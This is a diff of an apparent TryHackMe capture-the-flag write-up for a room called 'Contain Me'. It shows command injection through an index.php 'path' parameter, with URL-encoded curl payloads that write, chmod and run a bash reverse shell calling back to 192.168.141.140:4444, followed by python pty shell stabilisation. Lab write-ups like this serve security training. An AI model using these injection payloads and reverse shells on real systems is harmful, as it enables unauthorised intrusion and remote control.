@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/contain-me/","created":"2026-04-02T15:14:28.705+02:00","updated":"2026-04-02T23:25:23.629+02:00","dg-note-properties":{}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/contain-me/","created":"2026-04-02T15:14:28.705+02:00","updated":"2026-04-02T23:40:20.327+02:00","dg-note-properties":{}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -208,11 +208,13 @@ So **python perl and bash** are available which explains why spawning a reverse 
 It is possible to write the bash command to a **.sh** script and write it to the server using the **URL-encoding method** to achieve a reverse shell.
 #### Step 1: Write it to the Server
 
-**Decoded**
+**Decoded Payload**
 This writes the command from earlier into a .sh script and writes it to the server in the **/tmp** folder
+
 `/tmp;echo 'bash -i >& /dev/tcp/192.168.141.140/4444 0>&1' > /tmp/shell.sh"`
 
-**Encoded**
+**Encoded Payload**
+
 ```
 curl "http://10.112.132.114/index.php?path=/tmp;echo%20'bash%20-i%20>%26%20/dev/tcp/192.168.141.140/4444%200>%261'%20>%20/tmp/shell.sh"
 ```
@@ -222,9 +224,11 @@ curl "http://10.112.132.114/index.php?path=/tmp;echo%20'bash%20-i%20>%26%20/dev/
 #### Step 2: Make it Executable
 
 **Decoded**
+
 `curl"http://10.112.132.114/index.php?path=/tmp;chmod +x /tmp/shell.sh"`
 
 **Encoded**
+
 ```
 curl "http://10.112.132.114/index.php?path=/tmp;chmod%20+x%20/tmp/shell.sh"
 ```
@@ -234,9 +238,11 @@ curl "http://10.112.132.114/index.php?path=/tmp;chmod%20+x%20/tmp/shell.sh"
 #### Step 3: Execute it
 
 **Decoded**
+
 `curl"http://10.112.132.114/index.php?path=/tmp;bash /tmp/shell.sh"`
 
 **Encoded**
+
 ```
 curl "http://10.112.132.114/index.php?path=/tmp;bash%20/tmp/shell.sh"
 ```
@@ -244,6 +250,21 @@ curl "http://10.112.132.114/index.php?path=/tmp;bash%20/tmp/shell.sh"
 #### Reverse Shell 
 
 ![](/img/user/Attachments/reverse-shell.png)
+
+## Post-exploitation
+
+As always and is mandatory, the shell must be stabilized. 
+
+`python -c 'import pty;pty.spawn("/bin/bash")'`
+
+Running `export TERM=xterm`  sets the terminal type environment variable.
+
+Without it, many terminal features don't work properly — things like:
+
+- **Clear screen** (`clear` command)
+- **Arrow keys** for command history
+- **Tab completion**
+- **Text editors** like `nano` or `vim` display incorrectly
 
 
 **info.php**
@@ -262,7 +283,7 @@ Using searchsploit to search for anything ....
 
 
 
-## Post-exploitation
+
 
 ## Pwnage
 
